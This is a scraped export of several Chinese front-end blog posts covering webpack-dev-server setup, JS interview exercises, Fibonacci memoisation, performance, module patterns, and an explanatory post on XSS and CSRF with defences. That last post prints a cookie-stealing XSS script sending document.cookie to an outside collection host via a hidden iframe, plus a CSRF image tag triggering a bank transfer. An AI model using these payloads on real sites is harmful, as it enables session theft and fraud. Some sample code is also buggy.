正文今天在自己搭建react开发环境的时候，才知晓以前vue开发时自动更新是如何做到的，当然踩了不少坑，以下代码均是在webpack 3.3.0环境下操作。 webpack-dev-server安装webpack-dev-server就是起一个小型服务器，底层是express。1npm install webpack-dev-server --save-dev 配置 使用babel-loader以及各种相关的preset解析我们的react语法jsx以及es语法; 使用css-loader以及style-loader让我们能够在jsx中引入css文件; 使用file-loader以及url-loader对图片进行处理（还有坑爹的路径问题，下一篇文章写）。代码如下：12345678910111213141516171819202122232425262728293031323334353637383940414243var webpack = require('webpack');var path = require('path');module.exports = &#123; entry: &#123; app: path.join(__dirname, 'src', 'index.js') &#125;, module: &#123; loaders: [ &#123; // js的loader，可以理解为gulp里面对js文件进行操作的插件，此处是依赖babel-loader将我们所编写的es6以及jsx转变为浏览器可以识别的代码 test: /\\.js?$/, exclude: /(node_modules)/, loader: 'babel-loader', query: &#123; presets: ['react', 'es2015', 'stage-0'], plugins: ['react-html-attrs'],// 组件的插件配置，jsx可以不用写className，写class，其实意义不大 &#125; &#125;, &#123; test: /\\.css?$/, loader: 'style-loader!css-loader' &#125;, &#123; test: /\\.(png|jpg)$/, loader: 'url-loader?limit=8192&amp;name=images/[hash:8].[name].[ext]' &#125; ] &#125;, plugins: [ // 热更新需要的插件 new webpack.HotModuleReplacementPlugin(), ], output: &#123; path: path.resolve(__dirname, \"dist\"),// webpack后的bundle.js所在目录 filename: \"bundle.js\" &#125;, devServer: &#123; // 开发服务器配置 contentBase: \"./dist\", // 起服务器的目录,指定了服务器资源的根目录,服务器打包的bundle.js在内存中，通过改路径引用，而非output路径 historyApiFallback: true, port: 8000, hot: true, inline: true &#125;&#125; 划重点，要使用webpack-dev-server需要配置以下内容 一个插件： 123plugins: [ // 热更新需要的插件 new webpack.HotModuleReplacementPlugin(), ], 服务器配置文件 1234567devServer: &#123; // 开发服务器配置 contentBase: \"./\", // 起服务器的目录,指定了服务器资源的根目录,经过服务器打包的bundle.js在内存中，通过该路径引用，而非webpack打包的output路径 historyApiFallback: true, port: 8000, // 监听8000端口 hot: true, // 是否热更新 inline: true // inline模式 &#125; 后面几个参数看文档很好理解,重点理解第一个参数：contentBase，该参数规定了你的服务器根目录，比如apache的www文件夹，通过命令行参数将服务器运行起来，会自动打包生成一个bundle.js，但是这个bundle.js并不是我们原来使用webpack命令生成的那个bundle.js，可能这样说有点混乱。以下是我的理解： 命令行使用webpack命令，会根据webpack.config.js配置文件直接进行打包，并输出至output路径； 通过命令行启动webpack-dev-server服务，也会根据webpack.config.js配置文件直接进行打包，但不会在output路径下生成一个bundle.js，而是在内存中生成，每次文件发生变化也会自动生成,而是在服务器根目录contentBase下存在一个bundle.js，我们看不见。 比如文件结构如下：123----index.html----dist--------bundle.js 我们会在index.html中如此引用bundle.js1&lt;script type=\"text/javascript\" src=\"./dist/bundle.js\"&gt;&lt;/script&gt; 没毛病。但是如果你起了一个webpack-dev-server，服务器根目录为’./‘即项目根目录，那么这样你的网页并不会实时刷新，因为引用的一直是webpack打包生成的那个bundle.js，而非webpack-dev-server生成的bundle.js，我们应当改为：1&lt;script type=\"text/javascript\" src=\"./bundle.js\"&gt;&lt;/script&gt; 这样便可以引用到最新的bundle.js，实现实时刷新。 其实可以将index.html也放进dist目录，再将contentBase更改为’./dist’ 如此一来webpack生成的bundle.js与webpack-dev-server生成的bundle.js便可以通过相同路径引用了， 1&lt;script type=\"text/javascript\" src=\"./bundle.js\"&gt;&lt;/script&gt; webpack-dev-server的原理我猜应该是通过检测文件变化，随后使用websocket之类的能够由服务器向客户端发送信息的方式进行实时刷新。 对了，在package.json中配置如下命令可以通过npm start快速执行webpack-dev-server，少打几个字母。123\"scripts\": &#123; \"start\": \"webpack-dev-server --inline\" &#125;,","tags":[{"name":"webpack","slug":"webpack","permalink":"http://yoursite.com/tags/webpack/"}]},{"title":"最近遇到的一些js编程题","date":"2017-09-27T14:47:28.000Z","path":"2017/09/27/最近遇到的一些js编程题/","text":"数组扁平化例：输入：[[1, 2, 2], [3, 4, 5, 5], [6, 7, 8, 9, [11, 12, [12, 13, [14]]]], 10]输出：[ 1, 2, 2, 3, 4, 5, 5, 6, 7, 8, 9, 11, 12, 12, 13, 14, 10 ] 方法一12345678910var newArr = [];function flatten(arr) &#123; for (var i = 0; i &lt; arr.length; i++) &#123; if (Object.prototype.toString.call(arr[i]) === '[object Array]') &#123; flatten(arr[i]); &#125; else &#123; newArr.push(arr[i]); &#125; &#125;&#125; 方法二12345678var flatten = function(array) &#123; return array.reduce(function(previous, val) &#123; if (Object.prototype.toString.call(val) !== '[object Array]') &#123; return (previous.push(val), previous); &#125; return (Array.prototype.push.apply(previous, flatten(val)), previous); &#125;, []);&#125;; 方法三123456function flatten(arr) &#123; while (arr.some(item =&gt; Array.isArray(item))) &#123; arr = [].concat(...arr); &#125; return arr;&#125; 实现map12345678Array.prototype.myMap = function (callback) &#123; var arr = []; for (var i = 0; i &lt; this.length; i++) &#123; var item = callback(this[i], i); arr.push(item); &#125; return arr;&#125; 实现bind1234567Function.prototype.myBind = function (context) &#123; var self = this; var args = [].slice.call(arguments,1); return function () &#123; return self.apply(context, args.concat(arguments)); &#125;&#125; 实现一个简单的字符串模版引擎效果如下：123var str = 'hello, i am &lt;%=user%&gt;, from &lt;%=location%&gt;';var compiled = template(str);compiled(&#123;user: 'zzw', location: 'ez'&#125;); // 'hello, i am zzw, from ez' 代码：1234567891011121314function template(temp) &#123; var temp = temp; return function (obj) &#123; var reg = /&lt;%=(\\w+)%&gt;/; var result; console.log(temp); while (result = reg.exec(temp)) &#123; var key = result[1]; var value = obj[key]; temp = temp.replace(result[0], value); &#125; return temp; &#125;&#125; 实现深克隆1234567891011121314151617181920212223242526function deepClone(obj)&#123; var result,oClass=isClass(obj); //确定result的类型 if(oClass===\"Object\")&#123; result=&#123;&#125;; &#125;else if(oClass===\"Array\")&#123; result=[]; &#125;else&#123; return obj; &#125; for(key in obj)&#123; var copy=obj[key]; if(isClass(copy)==\"Object\" || isClass(copy)==\"Array\")&#123; result[key]=arguments.callee(copy);//递归调用 &#125;else&#123; //如果为基本数据类型 result[key]=obj[key]; &#125; &#125; return result;&#125;//返回传递给他的任意对象的类function isClass(o)&#123; if(o===null) return \"Null\"; if(o===undefined) return \"Undefined\"; return Object.prototype.toString.call(o).slice(8,-1);&#125; 深克隆变形题目：将json字符串所有键名第一个首字母转为大写(考虑嵌套对象)例：输入1&#123;\"hyKey\":\"myValue\",\"q23\":\"123\",\"arr\":[1,2,3],\"obj\":&#123;\"name\":\"zzw\"&#125;,\"null\":null&#125; 输出:1&#123;\"HyKey\":\"myValue\",\"Q23\":\"123\",\"Arr\":[1,2,3],\"Obj\":&#123;\"Name\":\"zzw\"&#125;,\"Null\":null&#125; 12345678910111213141516171819function toUpperCase1(obj) &#123; var result,oClass=isClass(obj); if(oClass===\"Object\")&#123; result=&#123;&#125;; &#125;else if(oClass===\"Array\")&#123; result=[]; &#125;else&#123; return obj; &#125; for(var key in obj)&#123; var copy=obj[key]; if(isClass(copy)==\"Object\" || isClass(copy)==\"Array\")&#123; result[key.slice(0, 1).toUpperCase() +key.slice(1)]=arguments.callee(copy); &#125;else&#123; result[key.slice(0, 1).toUpperCase() +key.slice(1)]=obj[key]; &#125; &#125; return result;&#125; 事件委托实现：给定一个ul列表，里面有若干个li标签，li里面也嵌套了若干标签，要求点击标签，弹出当前li在ul中的位置.12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;ul id=\"ul\"&gt; &lt;li&gt;&lt;a href=\"#\"&gt;&lt;span&gt;li-a-span&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &lt;a href=\"#\"&gt;a&lt;/a&gt; &lt;li&gt;&lt;a href=\"#\"&gt;&lt;span&gt;li-a-span&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;&lt;span&gt;li-a-span&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;&lt;span&gt;li-a-span&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;&lt;span&gt;li-a-span&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/html&gt; 1234567891011121314var ul = document.getElementById('ul');ul.addEventListener('click', function (e) &#123; // 事件委托 var e = e.target; while (e.nodeName != 'LI') &#123; e = e.parentNode; &#125; var childrenArr = [].slice.apply(ul.children);// 伪数组转为数组 为了使用filter方法 var liArr = childrenArr.filter(function (child) &#123; if (child.nodeName == 'LI') &#123; return child; &#125; &#125;) console.log(liArr.indexOf(e));&#125;) 输出字符串中所有的叠词输入： ‘晴川历历汉阳树，芳草萋萋鹦鹉洲’输出： [ ‘历历’, ‘萋萋’ ]123456789function rw(str) &#123; var result = []; for (var i = 1; i &lt; str.length; i++) &#123; if(str[i] == str[i-1]) &#123; result.push(str.slice(i-1,i+1)); &#125; &#125; return result;&#125; 实现一个add函数执行如下：12345678910111213141516171819function add() &#123; var sum = 0; var arr = [].slice.call(arguments); for (var i = 0; i &lt; arr.length; i++) &#123; sum += arr[i]; &#125; var temp = function() &#123; var arr = [].slice.call(arguments); for (var i = 0; i &lt; arr.length; i++) &#123; sum += arr[i]; &#125; return temp; &#125; temp.toString = function () &#123; return sum; &#125; return temp;&#125;","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"关于斐波那契数列的一些思考","date":"2017-09-27T14:46:32.000Z","path":"2017/09/27/斐波那契数列的一些思考/","text":"先看代码:123456789101112function fib(n)&#123; if(n===1)&#123; return 1; &#125; if(n===2)&#123; return 1; &#125; if(n&gt;2)&#123; return fib(n-1)+fib(n-2); &#125;&#125;console.log(fib(11)); 这是一个很典型的利用递归计算斐波那契数列 递归的缺点也是显而易见的,我们计算fib(6)时 要计算fib(5)和fib(4) 而后计算fib(7)时,又要重复计算fib(6)与fib(5) 很明显,我们之前已经计算过了fib(6)与fib(5),现在重复计算,造成了浪费。 首先我们来观察一下 当n从20到21时,调用此函数 内部会多调用多少次此函数? 123456789101112131415161718var count=0;//计数器function fib(n)&#123; count++; if(n===1)&#123; return 1; &#125; if(n===2)&#123; return 1; &#125; if(n&gt;2)&#123; return fib(n-1)+fib(n-2); &#125;&#125;console.log(fib(20));console.log(count);//13529次count = 0;console.log(fib(21));console.log(count);//35420次 从20到21 调用次数增加很多 其实我们完全可以将之前计算过的数值用一个数组保存起来，如果需要重复计算，先去数组内部查找，如果数组里面存在该结果，直接return 12345678910111213141516var cache = [0,1,1];function fib(n)&#123; if(n&lt;=2)&#123; return cache[n]; &#125;else&#123; if(cache[n])&#123; //如果缓存数组中存在 直接返回 return cache[n]; &#125;else&#123; var temp = fib(n-1)+fib(n-2); //如果缓存数组中不存在 进行递归 cache[n]=temp; //将递归结果存入缓存数组 return temp; &#125; &#125; &#125; console.log(fib(20)); 这样已经能够节省很多递归造成的空间浪费。 但缓存数组孤零零的放在全局作用域，不够安全，封装性也不好。 我们希望他们联系的能够更紧密一些，就像一个整体。 于是有了下面的代码：1234567891011121314151617var fib = (function()&#123; var cache = [0,1,1]; var fib = function() &#123; if(n&lt;=2)&#123; return cache[n]; &#125;else&#123; if(cache[n])&#123; //如果缓存数组中存在 直接返回 return cache[n]; &#125;else&#123; var temp = fib(n-1)+fib(n-2); //如果缓存数组中不存在 进行递归 cache[n]=temp; //将递归结果存入缓存数组 return temp; &#125; &#125; &#125; return fib;&#125;)() 这样，我们通过闭包，只能通过返回的fib方法对cache进行操作了。 当然，你也可以像下面这样写： 1234567891011121314151617181920212223242526function createCache()&#123; var cache=[0,1,1];//缓存数组被封装在闭包中,外界只能通过返回的方法进行操作 return function editCache(index,value)&#123; if(value==undefined)&#123; return cache[index]; &#125;else&#123; cache[index]=value; &#125; &#125; &#125; var fibCache=createCache();//创建缓存数组并且获取接口方法 function fib(n)&#123; if(n&lt;=2)&#123; return fibCache(n); &#125;else&#123; if(fibCache(n))&#123; return fibCache(n); &#125;else&#123; var temp = fib(n-1)+fib(n-2); fibCache(n,temp); return temp; &#125; &#125; &#125; 递归效率低是函数调用的开销导致的。在一个函数调用之前需要做许多工作，比如准备函数内局部变量使用的空间、搞定函数的参数等等，这些事情每次调用函数都需要做，因此会产生额外开销导致递归效率偏低，知乎其实一般递归的方法我们都可以通过迭代的方式来做，for循环就是一个很好的选择： 12345678910function fib(n) &#123; if (n == 1 || n == 2) &#123; return 1; &#125; var arr = [0,1,1]; for(var i = 2; i &lt;= n; i++) &#123; arr[i] = arr[i-1] + arr[i-2]; &#125; return arr[n];&#125; 看起来也挺好的，是吧。 下面进入算法时间，题目来自《剑指Offer》，当然，递归依然是主角。 题目一：一只青蛙一次可以跳上 1 级台阶，也可以跳上 2 级。求该青蛙跳上一个 n 级的台阶总共有多少种跳法？ 解题：数学归纳法。1级台阶，1种跳法，直接跳上1级台阶 f(1) = 12级台阶，2种跳法，直接跳上2级台阶或者连续跳两次，每次一级 f(2) = 23级台阶，3种跳法，如果第一次跳1级，剩下2级台阶，f(2) = 2种跳法;如果第一次跳2级，剩下1级台阶，f(1) = 1种跳法。f(3) = f(2) + f(1) = 2 + 1 = 34级台阶，5种跳法，如果第一次跳1级，剩下3级台阶，由上一条可知有3种跳法；如果第一次跳2级，剩下2级台阶，由上上条可知有2种跳法，f(4) = f(3) + f(2) = 3 + 2 = 5规律很清楚了，斐波那契数列变一变就是的了： 123456789function jump(n) &#123; if (n &lt;= 0) &#123; return; &#125; else if (n &gt; 0 &amp;&amp; n &lt;= 2) &#123; return n; &#125; else if (n &gt; 2) &#123; return jump(n-1) + jump(n-2); &#125;&#125; 题目二：一只青蛙一次可以跳上 1 级台阶，也可以跳上 2 级……它也可以跳上 n 级。求该青蛙跳上一个 n 级的台阶总共有多少种跳法？ 解题：继续归纳。1级台阶，1种跳法2级台阶，2种跳法3级台阶，4种跳法 f(3) = f(2) + f(1) + 1 = 44级台阶，第一次跳1级，后面有f(3)种跳法，第一次跳2级，后面有f(2)种跳法，第一次跳3级，后面有f(1)种跳法，第一次跳4级，没了。总共f(4) = f(3) + f(2) + f(1) + 1 = 8种跳法5级台阶，f(5) = f(4) + f(3) + f(2) + f(1) + 1 = 16种跳法归纳得，f(n) = f(n-1) + f(n-2) + … + f(1) + 1 1234567891011121314function jump(n) &#123; if (n &lt;= 0) &#123; return; &#125; else if (n &gt; 0 &amp;&amp; n &lt;= 2) &#123; return n; &#125; else if (n &gt; 2) &#123; var tmp = 0; while(number &gt; 1)&#123; tmp+=jump(n-1); number--; &#125; return tmp+1; &#125;&#125; 再来看看jQuery中的缓存机制: 自己实现如下: function createCache(){//不使用自执行函数创建块级作用域的原因是: //我们要多次创建这里面的内容(有多个缓存),而不是像原来一样仅仅创建一次 var cache={}; //创建缓存对象 var index=[];//存放键名的数组,用于缓存过多时进行清理(因为缓存对象无法判断有多少个缓存在内) return function editCache(key,value){ if(value===undefined){ return cache[key];//如果不传value就是查询 }else{ cache[key]=value;//如果传了value就是设置 index.push(key); if(index.length&gt;=50){//当缓存的数量到达一个临界时(此处是50),删除最早的缓存 var tempKey = index.shift();//获取键名 并 删除 index中的该键 delete cache[tempKey];//删除cache内的属性 } } } } var eleCache=createCache(); var typeCache=createCache();//多次创建,每一个Cache都有自己的一个空间 var classCache=createCache(); var eventCache=createCache(); eleCache(&quot;name&quot;,&quot;zhaozhiwen&quot;);//store elemCache(&quot;name&quot;)//get jQuery源码: function createCache() { var keys = []; function cache( key, value ) { //这里直接将这个函数当作缓存对象,减少了创建对象的次数 //同时由于缓存属性都是直接加在这个对象上 且return出去了 可以直接通过cache[&apos;键名&apos;]获取缓存值 于是函数内部设置缓存即可 //分两个角度看: 当cache是对象是 他有缓存属性 用于查询 //当cache是方法时 他给自己(对象)设置添加缓存 //更简洁 jQuery的优美之处啊 巧夺天工 // 使用(key + &quot; &quot;) 是为了避免和原生（本地）的原型中的属性冲突 if ( keys.push( key + &quot; &quot; ) &gt; 3 ) { // 只保留最新存入的数据 delete cache[ keys.shift() ]; } // 1 给 cache 赋值 // 2 把值返回 return (cache[ key + &quot; &quot; ] = value); } return cache; } var typeCache = createCache(); //创建缓存对象并获取接口方法 /* typeCache(&quot;monitor&quot;,&quot;周娇娇&quot;); console.log(typeCache[&quot;monitor&quot;]);//这样是查不到的,因为存储的时候 加了&quot; &quot; */ typeCache(&quot;monitor1&quot;,&quot;张学友&quot;); //向缓存中存入内容 console.log(typeCache[&quot;monitor1 &quot;]); //通过键名取出内容 typeCache(&quot;monitor2&quot;,&quot;刘德华&quot;); console.log(typeCache[&quot;monitor2 &quot;]); typeCache(&quot;monitor3&quot;,&quot;彭于晏&quot;); console.log(typeCache[&quot;monitor3 &quot;]); typeCache(&quot;monitor4&quot;,&quot;赵志文&quot;); //这次再进行缓存,超出了限制,第一个缓存被干掉了 console.log(typeCache[&quot;monitor1 &quot;]); //undefined","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"前端性能优化","date":"2017-09-24T11:22:36.000Z","path":"2017/09/24/前端性能优化/","text":"性能优化感觉大家都能说出几条来，粗略点无非是减少http请求、减轻请求数据大小等等，详细点就是css/js合并压缩、雪碧图等等，但实在是散乱无章，如何有条理地回答面试官的问题就很重要了，其实可以从不同的维度，不同方面去进行回答。总结自：鸟瞰前端 , 再论性能优化 预备知识“从用户输入URl到页面展示给用户浏览器客户端的过程中发生了什么？”前端经典面试题: 从输入URL到页面加载发生了什么？ 浏览器渲染原理 HTML被解析成DOM Tree，CSS被解析成CSS Rule Tree 把DOM Tree和CSS Rule Tree经过整合生成Render Tree（布局阶段） 元素按照算出来的规则，把元素放到它该出现的位置，通过显卡画到屏幕上 CSS不会阻塞DOM Tree生成，会阻塞渲染，但JS会阻塞DOM 加载。 重绘和回流如何写出高性能DOM？ 浏览器宿主环境1. 突破单线程解析渲染阻塞限制浏览器是一个单线程解析模式去解析渲染从服务器端拿到的html文本，css加载（渲染）的过程中会对后续的脚本资源加载造成阻塞，脚本的加载也会阻塞后续DOM结构的解析造成页面的留白时间增长，雅虎的35条军规中有一条就是样式文件放在头部，脚本文件放在DOM节点最末尾，减少阻塞。这里还有几个针对脚本文件的优化： 针对不需要DOM操作（主要考虑是需要操作DOM的脚本往往需要获取一些样式信息）的Js脚本可以采用动态创建script的方式载入，动态载入的脚本不阻塞后续资源的加载。 脚本文件加载可以加上defer或者async属性标识防止阻塞defer是在HTML解析完之后才会执行，如果是多个，按照加载的顺序依次执行async是在加载完成后立即执行，如果是多个，执行顺序和加载顺序无关 2. 避开Cookie性能bug——静态资源CDNCookie是前端作为前后台登录态校验最通常用的缓存方案，但鉴于浏览器在每次都会往同域的任何资源的http请求中自动带上cookie信息的情况，这里有必要进行优化一下，因为像css、js、image这些资源请求是不需要cookie信息的，会无端造成请求带宽的浪费（想象一下我们的cookie大小假设为10K，100个请求就是近1M的大小，高并发下以我们现行网络带宽也是蛮大的一笔负担了）。 Cookie free性能优化方案的处理方式是CDN异域静态资源服务器部署我们的前端css、js、image资源。 3. 代码优化——事件委托等其实这里有很多点： 要插入DOM片段时最好使用fragment一次性插入； 动态生成100li如何绑定事件，可以通过事件冒泡利用事件委托给父元素绑定事件即可； 对于查找过的节点可以缓存下来，避免再次查找 … DNS层DNS预解析前端优化:DNS预解析提升页面速度这里也是我第一次遇到link标签的另外用法。 HTTP层1. 减少HTTP请求数量 合并CSS、JS文件 CSS sprites雪碧图 font-icon字体图标 图片base64编码传输 图片懒加载 HTTP缓存机制 2. 减轻HTTP请求数据大小 css、script、图片压缩：这些可以gulp或者webpack自动化脚本里面定义脚本任务来完成。 服务器开启gzip压缩：一般现在服务器都有开启Gzip压缩，压缩率通常都是30%以上，效果还是不错的。","tags":[{"name":"前端性能","slug":"前端性能","permalink":"http://yoursite.com/tags/前端性能/"}]},{"title":"前端模块化（一）","date":"2017-09-19T01:18:36.000Z","path":"2017/09/19/前端模块化（一）/","text":"其实作为一个秋招狗，前端还没写够一年就来大谈特谈这些历史性问题，的确是不够格的，但是这又是学习前端学习者无法避免的一个问题，加上面试提问颇多，于是来总结一二。 站在巨人的肩膀上。参考资料：Javascript模块化编程（一）：模块的写法Javascript模块化历程 模块模块就是实现特定功能的一组方法。 最开始笔者学习js的时候，新建一个js文件，直接在里面写逻辑代码，然后script标签引入即可，一两个小网页是无妨的，但是随后后面逻辑越来越复杂，代码量越来越大，可复用的要求越来越多，笔者也是看着越来越混乱的js文件焦灼无比。 毕竟js最初只是作为一门“玩具语言”闯进开发者的视野，甚至这门语言仅仅花了不到一个月的时间就被创造了出来，我们如今看见的js，是开发者与互联网不断的磨合妥协下的js. 所以开发者不得不使用软件工程的方法，管理网页的业务逻辑。 但是，Javascript不是一种模块化编程语言，它不支持”类”（class），更遑论”模块”（module）了。（正在制定中的ECMAScript标准第六版，将正式支持”类”和”模块”，但还需要一段时间才能投入实用。） “Don`t repeat yourself”是我们的准则，如何更好的去实践这条准则就是我们今天要讲的内容。 函数封装直接在页面中写逻辑代码是我最初的做法，后来慢慢地学会了将重复的代码封装至一个函数之内，需要时调用函数即可。函数一个功能就是实现特定逻辑的一组语句打包，而且JavaScript的作用域就是基于函数的，所以把函数作为模块化的第一步是很自然的事情。 只要把不同的函数（以及记录状态的变量）简单地放在一起，就算是一个模块。 123456function fn1()&#123; statement&#125;function fn2()&#123; statement&#125; 这样在需要的以后加载函数所在文件，调用函数就可以了。 这种做法的缺点很明显：污染了全局变量，无法保证不与其他模块发生变量名冲突，而且模块成员之间没什么关系。 对象我们需要一个方法将全局变量减少，于是对象写法很自然的就出现了。 12345678var myModule = &#123; fn1: function()&#123; statement &#125;, fn2: function(val)&#123; statement &#125;&#125; 世界美好了那么一点点。 这样我们在希望调用模块的时候引用对应文件，然后 1myModule.fn1(); 但是我们看看下面这段代码。 12345678910var myModule = &#123; var1: 1, var2: 2, fn1: function()&#123; return var1; &#125;, fn2: function(val)&#123; var2 = val; &#125;&#125; 不知道大家发现没有，我明明可以直接通过 1myModule.var1; 直接获取var1，那我还要调用fn1去return干嘛，简直奇怪。 没错，看似不错的解决方案，但是也有缺陷，这样的写法会暴露所有模块成员，内部状态可以被外部改写，毫无封装型可言。 在别的语言中可以很轻易的实现私有变量，例如java的private关键字，但是js需要通过别的手段来实现。 我们希望外部不能够如此随意的访问或者修改某一个变量，只能通过我们规定的特权方法去访问模块的变量，而无法直接改写内部状态，于是有了闭包。 闭包没错，闭包又出现了，当初学习闭包的时候，网上的种种文章，描述了闭包的定义，闭包的特点，以及如何实现闭包，但是，他们就是没有告诉你闭包主要是拿来做什么的，在我看来，闭包就是模块化的基础！ 前面我们提到过JavaScript的作用域就是基于函数的，我们可以通过这一点将想要隐藏起来的变量置于函数作用域中，根据作用域链访问的原则，外层是无法访问到该变量的， 看下面代码12345678910111213var module1 = (function()&#123; var var1 = 0; var fn1 = function()&#123; //... &#125;; var fn2 = function()&#123; //... &#125;; return &#123; fn1 : fn1, fn2 : fn2 &#125;; &#125;)(); 这里是一个立即执行函数，return一个对象，该对象内部的函数是可以直接访问到var1的（闭包），而外部再也不能轻易的去访问var1了，只能通过module1的方法去访问，世界又美好了一点。 PS：我一直觉得立即执行函数的本质就只是为了立即执行而已，不理解为什么还特地产生了一个概念，如果您有更好的解答，请写下您的评论。 module1就是Javascript模块的基本写法。 当然还有类似于jq的那种写法， 123var module1 = (function ($, YAHOO) &#123; //... &#125;)(jQuery, YAHOO); 独立性是模块的重要特点，模块内部最好不与程序的其他部分直接交互。 为了在模块内部调用全局变量，必须显式地将其他变量输入模块。 输入全局变量，这样做除了保证模块的独立性，还使得模块之间的依赖关系变得明显。 看懂了上面的，这一个应当很容易理解。 下集预告：AMD/CMD/Commonjs/ES6 最近一直在总结校招重点，而那些重点基本是搜集别人的文章里面的，发在简书上未免有拿别人的文章骗赞之嫌。 所以有面试的小伙伴们可以去我的博客看看，相互交流，共同提升。","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"前端安全：XSS与CSRF","date":"2017-09-15T15:39:52.000Z","path":"2017/09/15/前端安全：XSS与CSRF/","text":"整理自:详解XSS与CSRF两种跨站攻击总结 XSS 与 CSRF 两种跨站攻击 XSS跨站脚本（Cross-site scripting，通常简称为XSS）原理XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。 举例：假设xx贴吧存在这个漏洞，我打开一个帖子回复： 1234// 用&lt;script type=\"text/javascript\"&gt;&lt;/script&gt;包起来while (true) &#123; alert('hello,xss');&#125; 然后这条回复就发出去啦，当其他用户点进这个帖子，这段代码就会被执行，然后一直alert，这就是最原始的脚本注入。 那XSS跨站脚本也很容易理解了，注入一个可以跨站的脚本即可： 123456789101112131415// 用 &lt;script type=\"text/javascript\"&gt;&lt;/script&gt; 包起来放在评论中(function(window, document) &#123; // 构造泄露信息用的 URL var cookies = document.cookie; var xssURIBase = \"http://192.168.123.123/myxss/\"; var xssURI = xssURIBase + window.encodeURI(cookies); // 建立隐藏 iframe 用于通讯 var hideFrame = document.createElement(\"iframe\"); hideFrame.height = 0; hideFrame.width = 0; hideFrame.style.display = \"none\"; hideFrame.src = xssURI; // 开工 document.body.appendChild(hideFrame);&#125;)(window, document); 这时候，用户点进帖子，这段代码开始运行，他们并不知道自己的信息（cookie）已经被iframe跨域的方式送到收集服务器上，然后我们就可以用cookie中的隐私信息做很多很多事情啦。 如何防御XSS攻击我们知道AJAX技术所使用的XMLHttpRequest对象都被浏览器做了限制，只能访问当前域名下的 URL，所谓不能“跨域”问题。这种做法的初衷也是防范XSS，多多少少都起了一些作用，但不是总是有用，正如上面的注入代码，用iframe也一样可以达到相同的目的。甚至在愿意的情况下，我还能用iframe发起POST请求。当然，现在一些浏览器能够很智能地分析出部分 XSS 并予以拦截，例如新版的 Firefox、Chrome 都能这么做。但拦截不总是能成功，何况这个世界上还有大量根本不知道什么是浏览器的用户在用着可怕的IE6。从原则上将，我们也不应该把事关安全性的责任推脱给浏览器，所以防止XSS的根本之道还是过滤用户输入。用户输入总是不可信任的，这点对于 Web 开发者应该是常识。 正如上文所说，如果我们不需要用户输入HTML而只想让他们输入纯文本，那么把所有用户输入进行 HTML 转义输出是个不错的做法。 CSRF跨站请求伪造（ross-site request forgery）跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。 你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。 严格意义上来说，CSRF 不能分类为注入攻击，因为 CSRF 的实现途径远远不止 XSS 注入这一条。通过XSS来实现CSRF易如反掌，但对于设计不佳的网站，一条正常的链接都能造成 CSRF。 原理 从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤： 登录受信任网站A，并在本地生成Cookie。 在不登出A的情况下，访问危险网站B。 举例 你登录银行网站A，银行网站A违反了HTTP规范，使用GET请求更新资源。这就存在了csrf漏洞。 你访问危险网站B，B中有一段代码 1&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt; 你发现你的账户少了1000元 为什么会这样呢？原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，你已经登录了银行网站A，而B中的以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站A的Cookie发出Get请求，去获取资源http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000 ，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作。 如何防御CSRF攻击 通过 referer 判定来源页面 referer是在HTTP Request Head里面的，也就是由请求的发送者决定的。如果我喜欢，可以给 referer任何值。当然这个做法并不是毫无作用，起码可以防小白。 使用验证码 在表单中增加一个随机的数字或字母验证码，通过强制用户和应用进行交互，来有效地遏制CSRF攻击。 token验证 在 HTTP 请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有token或者token内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。 token需要足够随机 敏感的操作应该使用POST，而不是GET，以form表单的形式提交，可以避免token泄露。 在 HTTP 头中自定义属性并验证 这种方法也是使用 token 并进行验证，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到HTTP头中自定义的属性里。通过 XMLHttpRequest这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。 我的理解：WebB并没有获取你的cookie，而只是伪造用户发起http请求，浏览器自动带上cookie而已，token存放在cookie中，即使cookie发送至服务端，我们每一次接受请求验证的并不是cookie，而是header中的token，WebB就无能为力了。 XSS与CSRF的区别CSRF 和 XSS 